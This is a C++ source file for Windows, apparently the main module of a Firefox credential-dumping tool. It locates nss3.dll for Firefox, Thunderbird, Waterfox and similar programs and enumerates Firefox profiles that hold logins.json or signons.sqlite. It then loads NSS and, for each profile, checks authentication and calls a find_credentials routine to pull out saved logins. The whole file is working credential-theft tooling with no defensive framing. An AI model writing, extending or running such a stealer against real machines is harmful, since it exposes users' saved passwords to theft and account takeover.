#include <iostream>
#include <vector>
#include <string>
#include <filesystem>
#include <Windows.h>

#include <ShlObj.h>
#include <wil/resource.h>

#include "ffbt.hxx"

std::filesystem::path get_nss_location();
std::vector<std::filesystem::path> get_valid_profiles();

int main()
{
    std::filesystem::path nss_dir = get_nss_location();
    std::vector<std::filesystem::path> valid_profiles = get_valid_profiles();
    if (valid_profiles.empty()) {
        std::cout << "Could not find a valid profile... Exiting\n";
        return 0;
    }

    FFBT ffbt;
    int status;
    for (auto profile = begin(valid_profiles); profile != end(valid_profiles); ++profile)
    {
        status = ffbt.Load_NSS(nss_dir);            if (status!=0) { std::cerr << "Exiting\n"; ffbt.NSS_KILL(); return 0; }
        status = ffbt.Initialize_Profile(*profile); if (status!=0) { std::cerr << "Exiting\n"; ffbt.NSS_KILL(); return 0; }
        status = ffbt.Check_Authentication();       if (status!=0) { std::cerr << "Exiting\n"; ffbt.NSS_KILL(); return 0; }
        status = ffbt.find_credentials(*profile);   if (status!=0) { std::cerr << "Exiting\n"; ffbt.NSS_KILL(); return 0; }
    }
    ffbt.NSS_KILL();
    return 0;
}

std::filesystem::path get_nss_location()
{
    std::cout << "\nSearching for nss3.dll...\n";
    std::vector<std::string> mozilla_dirs {
        "Mozilla Firefox", "Firefox Developer Edition",
        "Nightly", "Mozilla Thunderbird",
        "SeaMonkey", "Waterfox"
    };

    wil::unique_cotaskmem_string local_appdata_path;
    SHGetKnownFolderPath(FOLDERID_LocalAppData, KF_FLAG_DONT_UNEXPAND, NULL, &local_appdata_path);;
    
    std::filesystem::path local_path = local_appdata_path.get(),
                          root_path = "C:\\Program Files";

    for (auto dir : mozilla_dirs)
    {
        if (std::filesystem::exists(local_path / dir / "nss3.dll")) {
            std::cout << "[+] NSS found in " << (local_path / dir).string() << "\n\n";
            return local_path / dir;
        }
        if (std::filesystem::exists(root_path / dir / "nss3.dll")) {
            std::cout << "[+] NSS found in " << (root_path / dir).string() << "\n\n";
            return root_path / dir;
        }
    }
    std::cout << "[-] Could not find NSS :( Exiting...\n\n";
    exit(1);
}


std::vector<std::filesystem::path> get_valid_profiles()
{
    std::cout << "Searching for Profiles...\n";
    // C:/Users/{USER}/AppData/Roaming/Mozilla/Firefox/
    wil::unique_cotaskmem_string roaming_appdata_path;
    SHGetKnownFolderPath(FOLDERID_RoamingAppData, KF_FLAG_DONT_UNEXPAND, NULL, &roaming_appdata_path);
    std::filesystem::path prof_path = roaming_appdata_path.get();
    prof_path =  prof_path / "Mozilla" / "Firefox" / "Profiles";

    // could read profiles.ini or just check each dir in Profiles folder.
    // profiles.ini is a better practice i guess
    // check for signon.sqlite or login.json
    // add profile to vector if valid
    std::vector<std::filesystem::path> valid_profile_list;
    for (const auto & entry : std::filesystem::directory_iterator(prof_path)) {
        std::cout << "Profile found: " << entry.path() << "\n";
        if (std::filesystem::exists(entry.path() / "logins.json") ||
            std::filesystem::exists(entry.path() / "signons.sqlite"))
        {
            std::cout << "[+] Valid Profile\n";
            valid_profile_list.push_back(entry.path());
        }
        else
        {
            std::cout << "[-] Bad Profile\n";
        }
    }
    return valid_profile_list;
}